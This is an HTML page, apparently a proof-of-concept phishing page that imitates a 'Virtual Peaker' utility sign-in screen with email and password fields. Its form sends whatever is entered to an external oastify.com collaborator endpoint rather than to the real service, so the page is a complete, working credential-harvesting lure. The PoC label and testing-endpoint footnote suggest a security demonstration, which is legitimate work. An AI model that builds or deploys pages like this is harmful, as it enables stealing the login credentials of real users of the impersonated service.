<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Utility Sign In | Virtual Peaker (PoC)</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@300;400;600&display=swap">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #eaeff5;
      font-family: 'Mulish', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      border-radius: 10px;
      padding: 30px 40px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      border-top: 10px solid #193b6d;
    }
    h2 {
      text-align: center;
      font-size: 24px;
      margin-bottom: 20px;
      color: #333;
    }
    .tabs {
      display: flex;
      border-bottom: 2px solid #eee;
      margin-bottom: 20px;
    }
    .tabs div {
      flex: 1;
      text-align: center;
      padding: 10px 0;
      cursor: pointer;
      font-weight: 600;
      color: #aaa;
    }
    .tabs .active {
      color: #193b6d;
      border-bottom: 3px solid #f28c28;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    label {
      font-size: 14px;
      color: #333;
      margin-bottom: 5px;
    }
    input {
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 15px;
    }
    .forgot {
      text-align: right;
      margin-top: -10px;
      margin-bottom: 15px;
    }
    .forgot a {
      color: #f28c28;
      font-size: 12px;
      text-decoration: none;
    }
    button {
      background: #f28c28;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 12px;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
    }
    .note {
      font-size: 11px;
      color: #888;
      text-align: center;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Utility Sign In</h2>
    <div class="tabs">
      <div class="active">Use Password</div>
      <div>Use Secure Link</div>
    </div>
    <form method="POST" action="http://r1t2f5ndv073o0m763p89qjpsgy7mzao.oastify.com">
      <label for="username">Email Address</label>
      <input type="email" id="username" name="username" placeholder="Enter your email address" required>

      <label for="password">Password <span class="forgot"><a href="#">Forgot password?</a></span></label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>

      <button type="submit">SIGN IN</button>
    </form>
    <div class="note">This is a PoC. Credentials are sent to a testing endpoint.</div>
  </div>
</body>
</html>
